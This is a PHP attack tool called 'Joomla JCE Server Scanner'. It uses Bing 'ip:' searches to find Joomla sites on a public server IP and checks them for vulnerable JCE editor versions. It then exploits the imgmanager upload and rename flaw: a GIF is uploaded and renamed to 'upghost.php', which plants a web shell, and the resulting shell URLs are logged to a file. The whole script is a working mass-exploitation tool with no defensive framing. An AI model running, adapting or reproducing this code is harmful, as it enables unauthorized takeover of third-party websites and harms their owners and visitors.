<?php
error_reporting(0);
set_time_limit(0);
echo "
                 _____   _    _   _____   _____  _______            
                /  ___| | |  | | /  _  \ /  ___/|__   __|           
                | |  _  | |__| | | | | | | |___    | |              
                | | | | |  __  | | | | | \___  \   | |              
                | |_| | | |  | | | |_| |  ___| |   | |              
                \_____/ |_|  |_| \_____/ /_____/   |_|              
             ____    _       _____   _____   _____  ___    ___        
            |  _ \  | |     /  _  \ /  _  \ |  _  \ \  \  /  /        
            | |_) | | |     | | | | | | | | | | |  \ \  \/  /         
            |  _ (  | |     | | | | | | | | | | |  |  \    /          
            | |_) | | |___  | |_| | | |_| | | |_|  /   |  |           
            |____/  |_____| \_____/ \_____/ |_____/    |__|           
    
[*]-----------------------------------------------------------------------[*]
[+] Script Name          : Joomla JCE Server Scanner
[+] Version              : 2.0
[+] Programed By         : G-B
[+] Email                : g22b@hotmail.com
[+] Use                  : php $_SERVER[PHP_SELF]
[*]-----------------------------------------------------------------------[*]
";
$a = true;
while($a){
    echo "[*] Server IP  -> ";
    $ip = trim(fgets(STDIN,1024));
    if(!checkIP($ip)){
        echo "\n[~] Error. Please Set A Valide IP.\n\n";
    }else{
        $a = false;
    }
}
echo "\n";
$fp = fopen('jce.txt','a+');
fwrite($fp,"[*]-----------------------------------------------------------------------[*]
                 _____   _    _   _____   _____  _______            
                /  ___| | |  | | /  _  \ /  ___/|__   __|           
                | |  _  | |__| | | | | | | |___    | |              
                | | | | |  __  | | | | | \___  \   | |              
                | |_| | | |  | | | |_| |  ___| |   | |              
                \_____/ |_|  |_| \_____/ /_____/   |_|              
             ____    _       _____   _____   _____  ___    ___        
            |  _ \  | |     /  _  \ /  _  \ |  _  \ \  \  /  /        
            | |_) | | |     | | | | | | | | | | |  \ \  \/  /         
            |  _ (  | |     | | | | | | | | | | |  |  \    /          
            | |_) | | |___  | |_| | | |_| | | |_|  /   |  |           
            |____/  |_____| \_____/ \_____/ |_____/    |__|           
    
[*]-----------------------------------------------------------------------[*]
[+] Script Name          : Joomla JCE Server Scanner
[+] Version              : 2.0
[+] Programed By         : G-B
[+] Email                : g22b@hotmail.com
[+] Result For           : $ip
[*]-----------------------------------------------------------------------[*]

");
$dork = urlencode("ip:$ip index.php?option=com_");
$pages = pages($dork);
$scanaed = array();
for($i=1;$i<=$pages;$i=$i+10){
    $src = send("http://www.bing.com/search?q=$dork&first=$i");
    preg_match_all('/<cite>(.*?)<strong>/',$src,$matches);
    $sites = $matches[1];
    foreach($sites as $site){
        $sitet = trim(str_replace('www.','',str_replace('/','',$site)));
        if(eregi('<',$sitet) || eregi('\?',$sitet)) continue;
        if(in_array($sitet,$scanaed)) continue;
            $scanaed[] = $sitet;
            echo "[~] check [ $site ] : ";
            if(check($site)){
                echo "Yes.\n";
                echo "    -> Upload Shell : ";
                if(exploit($site)){
                    echo "http://$site/images/stories/upghost.php\n\n";
                    fwrite($fp,"http://$site/images/stories/upghost.php
");
                }else{
                    echo "Error.\n\n";
                }
            }else{
                echo "No.\n";
            }
    }
}

fclose($fp);

function check($site){
    $str = array('2.0.11</title>','2.0.12</title>','2.0.13</title>','2.0.14</title>','2.0.15</title>','1.5.7.10</title>','1.5.7.11</title>','1.5.7.12</title>','1.5.7.13</title>','1.5.7.14</title>','1.5.0</title>');
    $src = send("http://$site/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20");
    foreach($str as $totest){
        if(eregi($totest,$src)){
            $done = true;
            break;
        }
    }
    if($done){
        return true;
    }else{
        return false;
    }
}
function exploit($site){
    // By Rab3oun
    $post["upload-dir"]="/";
    $post["upload-overwrite"]="1";
    $post["action"]="upload";
    $post["Filedata"]="@".getcwd()."/upghost.gif";
    
    $send1 = send("http://$site/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=9d09f693c63c1988a9f8a564e0da7743",$post,false,true);
    $send2 = send("http://$site/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20","json={\"fn\":\"folderRename\",\"args\":[\"/upghost.gif\",\"upghost.php\"]}",false,true,true);
    if (($send1 == '{"result":{"error":true,"result":""},"error":null}') && ($send2=='{"result":{"error":""},"error":null}')){
        return true;
    }else{
        return false;
    }
}
function send($url,$post=false,$ref=false,$follow=false,$json=false){
    $cookies = getcwd().'/cookies';
    $header[0] = "Accept: text/xml,application/xml,application/xhtml+xml,"; 
    $header[0] .= "text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"; 
    $header[] = "Cache-Control: max-age=0"; 
    $header[] = "Connection: keep-alive"; 
    $header[] = "Keep-Alive: 300"; 
    if($json){
        $header[] = "X-Request: JSON";
    }
    $header[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3"; 
    $header[] = "Accept-Language: en-US,en;q=0.8 "; 
    $header[] = "Pragma: ";
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false);
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch,CURLOPT_COOKIEFILE,$cookies);
    curl_setopt($ch,CURLOPT_COOKIEJAR,$cookies);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; rv:17.0) Gecko/20100101 Firefox/17.0');
    if($post){
        curl_setopt($ch,CURLOPT_POST,true);
        curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
    }
    if($follow) curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
    if($ref) curl_setopt($ch,CURLOPT_REFERER,$ref);
    $return = curl_exec($ch);
    curl_close($ch);
    if(file_exists($cookies)) unlink($cookies);
    return $return;
}
function pages($dork){
    $src = send("http://www.bing.com/search?q=$dork&go=&qs=n&sk=&filt=all&first=199&FORM=PERE3");
    $ex = explode('<span class="sb_count" id="count">',$src);
    $ex = explode('-',$ex['1']);
    return $ex[0];
}
function checkIP( $ip )
{
	if( !empty( $ip ) && ip2long( $ip ) != 0 - 1 && ip2long( $ip ) != false )
	{
		$private_ips = array(
			array( "0.0.0.0", "2.255.255.255" ),
			array( "10.0.0.0", "10.255.255.255" ),
			array( "127.0.0.0", "127.255.255.255" ),
			array( "169.254.0.0", "169.254.255.255" ),
			array( "172.16.0.0", "172.31.255.255" ),
			array( "192.0.2.0", "192.0.2.255" ),
			array( "192.168.0.0", "192.168.255.255" ),
			array( "255.255.255.0", "255.255.255.255" )
		);
		foreach( $private_ips as $r )
		{
			$min = ip2long( $r[0] );
			$max = ip2long( $r[1] );
			if( $min <= ip2long( $ip ) && ip2long( $ip ) <= $max )
			{
				return false;
			}
		}
		return true;
	}
	return false;
}
?>